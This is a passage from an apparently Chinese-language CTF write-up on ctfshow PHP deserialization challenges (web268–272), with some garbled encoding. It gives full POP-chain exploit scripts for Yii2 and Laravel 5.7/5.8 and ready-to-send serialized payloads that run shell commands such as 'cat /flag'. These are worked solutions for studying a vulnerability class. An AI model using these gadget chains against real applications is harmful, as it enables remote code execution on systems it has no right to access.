&#125;</span><br><span class="line">    <span class="keyword">namespace</span>&#123;        </span><br><span class="line">        <span class="title class_">use</span> <span class="title class_">Codeception</span>\<span class="title class_">Extension</span>\<span class="title class_">RunProcess</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">RunProcess</span>()));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?r=<span class="comment">///backdoor/shell&amp;code=TzozMjoiQ29kZWNlcHRpb25cRXh0ZW5zaW9uXFJ1blByb2Nlc3MiOjE6e3M6NDM6IgBDb2RlY2VwdGlvblxFeHRlbnNpb25cUnVuUHJvY2VzcwBwcm9jZXNzZXMiO2E6MTp7aTowO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjk6ImlzUnVubmluZyI7YToyOntpOjA7TzoyMDoieWlpXHJlc3RcSW5kZXhBY3Rpb24iOjI6e3M6MTE6ImNoZWNrQWNjZXNzIjtzOjQ6ImV4ZWMiO3M6MjoiaWQiO3M6MTI6ImNwIC9mKiAxLnR4dCI7fWk6MTtzOjM6InJ1biI7fX19fX0=</span></span><br><span class="line">è®¿é—®<span class="number">1</span>.txt</span><br></pre></td></tr></table></figure><h1 id="web269-Yii-plus-plus"><a href="#web269-Yii-plus-plus" class="headerlink" title="web269(Yii plus plus)"></a>web269(Yii plus plus)</h1><p>è¿˜æœ‰å§¿åŠ¿ï¼ï¼</p><ul><li>æƒ³éƒ½ä¸ç”¨æƒ³ï¼Œä¸Šé“é¢˜çš„payloadè¿˜æ˜¯ç”¨ä¸äº†</li><li>æ¢ä¸ªæ–°çš„<strong>exp</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">        <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">            <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">            <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;exec&#x27;</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;cp /f* 1.txt&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">        <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">            <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;render&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">phpDocumentor</span>\<span class="title class_">Reflection</span>\<span class="title class_">DocBlock</span>\<span class="title class_">Tags</span>&#123;</span><br><span class="line">        <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">See</span></span>&#123;</span><br><span class="line">            <span class="keyword">protected</span> <span class="variable">$description</span>;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;description = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span>&#123;</span><br><span class="line">        <span class="title class_">use</span> <span class="title class_">phpDocumentor</span>\<span class="title class_">Reflection</span>\<span class="title class_">DocBlock</span>\<span class="title class_">Tags</span>\<span class="title class_">See</span>;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Swift_KeyCache_DiskKeyCache</span></span>&#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="variable">$keys</span> = [];</span><br><span class="line">            <span class="keyword">private</span> <span class="variable">$path</span>;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;path = <span class="keyword">new</span> <span class="title class_">See</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;keys = <span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&quot;tingshuo&quot;</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;zheli&quot;</span>=&gt;<span class="string">&quot;suibianxie&quot;</span>)</span><br><span class="line">                );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ç”Ÿæˆpoc</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Swift_KeyCache_DiskKeyCache</span>()));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?r=<span class="comment">///backdoor/shell&amp;code=TzoyNzoiU3dpZnRfS2V5Q2FjaGVfRGlza0tleUNhY2hlIjoyOntzOjMzOiIAU3dpZnRfS2V5Q2FjaGVfRGlza0tleUNhY2hlAGtleXMiO2E6MTp7czo4OiJ0aW5nc2h1byI7YToxOntzOjU6InpoZWxpIjtzOjEwOiJzdWliaWFueGllIjt9fXM6MzM6IgBTd2lmdF9LZXlDYWNoZV9EaXNrS2V5Q2FjaGUAcGF0aCI7Tzo0MjoicGhwRG9jdW1lbnRvclxSZWZsZWN0aW9uXERvY0Jsb2NrXFRhZ3NcU2VlIjoxOntzOjE0OiIAKgBkZXNjcmlwdGlvbiI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NjoicmVuZGVyIjthOjI6e2k6MDtPOjIxOiJ5aWlccmVzdFxDcmVhdGVBY3Rpb24iOjI6e3M6MTE6ImNoZWNrQWNjZXNzIjtzOjQ6ImV4ZWMiO3M6MjoiaWQiO3M6MTI6ImNwIC9mKiAxLnR4dCI7fWk6MTtzOjM6InJ1biI7fX19fX0=</span></span><br><span class="line">è®¿é—®<span class="number">1</span>.txt</span><br></pre></td></tr></table></figure><h1 id="web270-Yii-plus-plus-plus"><a href="#web270-Yii-plus-plus-plus" class="headerlink" title="web270(Yii plus plus plus)"></a>web270(Yii plus plus plus)</h1><ul><li>å¯»æ‰¾æ–°çš„<strong>exp</strong>ä¸­</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span> &#123;</span><br><span class="line">        <span class="title class_">class</span> <span class="title class_">Action</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">IndexAction</span></span></span><br><span class="line"><span class="class">        </span>&#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;checkAccess = <span class="variable">$func</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;id = <span class="variable">$param</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">web</span> &#123;</span><br><span class="line">        <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">MultiFieldSession</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title class_">public</span> $<span class="title class_">writeCallback</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span> <span class="keyword">extends</span> <span class="title">MultiFieldSession</span></span></span><br><span class="line"><span class="class">        </span>&#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">          </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;writeCallback = [<span class="keyword">new</span> \yii\rest\<span class="title function_ invoke__">IndexAction</span>(<span class="variable">$func</span>, <span class="variable">$param</span>), <span class="string">&quot;run&quot;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span> &#123;</span><br><span class="line">        <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">base</span>\<span class="title class_">BaseObject</span>;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span></span><br><span class="line"><span class="class">        </span>&#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> \yii\web\<span class="title function_ invoke__">DbSession</span>(<span class="variable">$func</span>, <span class="variable">$param</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> &#123;</span><br><span class="line">        $<span class="title class_">exp</span> = <span class="title class_">new</span> \<span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>(&#x27;<span class="title class_">exec</span>&#x27;, &#x27;<span class="title class_">cp</span> /<span class="title class_">f</span>* 1.<span class="title class_">txt</span>&#x27;);</span><br><span class="line">        <span class="keyword">echo</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>)));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?r=<span class="comment">///backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czo0OiJleGVjIjtzOjI6ImlkIjtzOjEyOiJjcCAvZiogMS50eHQiO31pOjE7czozOiJydW4iO319fQ==</span></span><br><span class="line">è®¿é—®<span class="number">1</span>.txt</span><br></pre></td></tr></table></figure><h1 id="web271-Laravel5-7"><a href="#web271-Laravel5-7" class="headerlink" title="web271(Laravel5.7)"></a>web271(Laravel5.7)</h1><ul><li>æœäº†ä¸€ä¸‹æ³¨é‡Šå‘ç°è¿™æ˜¯ä¸ªLaravelæ¼æ´</li></ul><p>å‚è€ƒåšå®¢ï¼š</p><p><a href="https://blog.csdn.net/oiadkt/article/details/130343975">Laravel è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</a><br><a href="https://blog.csdn.net/rfrder/article/details/113826483">laravel5.7 ååºåˆ—åŒ–æ¼æ´</a></p><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span> &#123;</span><br><span class="line">        <span class="title class_">class</span> <span class="title class_">PendingCommand</span> &#123;</span><br><span class="line">            <span class="title class_">public</span> $<span class="title class_">test</span>;</span><br><span class="line">            <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">            <span class="keyword">protected</span> <span class="variable">$command</span>;</span><br><span class="line">            <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$test</span>, <span class="variable">$app</span>, <span class="variable">$command</span>, <span class="variable">$parameters</span></span>) </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;test = <span class="variable">$test</span>;                 <span class="comment">//ä¸€ä¸ªå®ä¾‹åŒ–çš„ç±» Illuminate\Auth\GenericUser</span></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;app = <span class="variable">$app</span>;                   <span class="comment">//ä¸€ä¸ªå®ä¾‹åŒ–çš„ç±» Illuminate\Foundation\Application</span></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;command = <span class="variable">$command</span>;           <span class="comment">//è¦æ‰§è¡Œçš„phpå‡½æ•° system</span></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;parameters = <span class="variable">$parameters</span>;     <span class="comment">//è¦æ‰§è¡Œçš„phpå‡½æ•°çš„å‚æ•°  array(&#x27;id&#x27;)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">Faker</span> &#123;</span><br><span class="line">        <span class="title class_">class</span> <span class="title class_">DefaultGenerator</span>&#123;</span><br><span class="line">            <span class="title class_">protected</span> $<span class="title class_">default</span>;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$default</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="keyword">default</span> = <span class="variable">$default</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span> &#123;</span><br><span class="line">        <span class="title class_">class</span> <span class="title class_">Application</span>&#123;</span><br><span class="line">            <span class="title class_">protected</span> $<span class="title class_">instances</span> = [];</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$instances</span> = []</span>) </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;instances[<span class="string">&#x27;Illuminate\Contracts\Console\Kernel&#x27;</span>] = <span class="variable">$instances</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> &#123;</span><br><span class="line">        $<span class="title class_">defaultgenerator</span> = <span class="title class_">new</span> <span class="title class_">Faker</span>\<span class="title class_">DefaultGenerator</span>(<span class="title class_">array</span>(&quot;<span class="title class_">hello</span>&quot; =&gt; &quot;<span class="title class_">world</span>&quot;));</span><br><span class="line">        <span class="variable">$app</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Foundation\Application</span>();</span><br><span class="line">        <span class="variable">$application</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Foundation\Application</span>(<span class="variable">$app</span>);</span><br><span class="line">        <span class="variable">$pendingcommand</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Foundation\Testing\PendingCommand</span>(<span class="variable">$defaultgenerator</span>, <span class="variable">$application</span>, <span class="string">&#x27;system&#x27;</span>, <span class="keyword">array</span>(<span class="string">&#x27;cat /flag&#x27;</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pendingcommand</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A4%3A%22test%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Ba%3A1%3A%7Bs%3A5%3A%22hello%22%3Bs%3A5%3A%22world%22%3B%7D%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00instances%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00instances%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3Ba%3A0%3A%7B%7D%7D%7D%7D%7Ds%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7D</span></span><br></pre></td></tr></table></figure><p><strong>payload:</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">burpæŠ“åŒ…ä¿®æ”¹postå€¼</span><br><span class="line"></span><br><span class="line">data=O%<span class="number">3</span>A44%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CFoundation%<span class="number">5</span>CTesting%<span class="number">5</span>CPendingCommand%<span class="number">22</span>%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>test%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A22%<span class="number">3</span>A%<span class="number">22</span>Faker%<span class="number">5</span>CDefaultGenerator%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span><span class="keyword">default</span>%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>hello%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>world%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>app%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A33%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CFoundation%<span class="number">5</span>CApplication%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A12%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>instances%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A35%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CContracts%<span class="number">5</span>CConsole%<span class="number">5</span>CKernel%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A33%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CFoundation%<span class="number">5</span>CApplication%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A12%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>instances%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A35%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CContracts%<span class="number">5</span>CConsole%<span class="number">5</span>CKernel%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>command%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>system%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>parameters%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>cat+%<span class="number">2</span>Fflag%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><h1 id="web272-Laravel5-8"><a href="#web272-Laravel5-8" class="headerlink" title="web272(Laravel5.8)"></a>web272(Laravel5.8)</h1><p>å¯»æ‰¾æ–°çš„<strong>exp</strong>ä¸­ã€‚ã€‚ã€‚</p><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">PhpParser</span>\<span class="title class_">Node</span>\<span class="title class_">Scalar</span>\<span class="title class_">MagicConst</span>&#123;</span><br><span class="line">        <span class="title class_">class</span> <span class="title class_">Line</span> &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Generator</span>&#123;</span><br><span class="line">        <span class="title class_">class</span> <span class="title class_">MockDefinition</span> &#123;</span><br><span class="line">            <span class="title class_">protected</span> $<span class="title class_">config</span>;</span><br><span class="line">            <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$config</span>, <span class="variable">$code</span></span>) </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;config = <span class="variable">$config</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;code = <span class="variable">$code</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Loader</span>&#123;</span><br><span class="line">        <span class="title class_">class</span> <span class="title class_">EvalLoader</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span>&#123;</span><br><span class="line">        <span class="title class_">class</span> <span class="title class_">Dispatcher</span> &#123;</span><br><span class="line">            <span class="title class_">protected</span> $<span class="title class_">queueResolver</span>;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$queueResolver</span></span>) </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;queueResolver = <span class="variable">$queueResolver</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Console</span>&#123;</span><br><span class="line">        <span class="title class_">class</span> <span class="title class_">QueuedCommand</span> &#123;</span><br><span class="line">            <span class="title class_">public</span> $<span class="title class_">connection</span>;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$connection</span></span>) </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;connection = <span class="variable">$connection</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        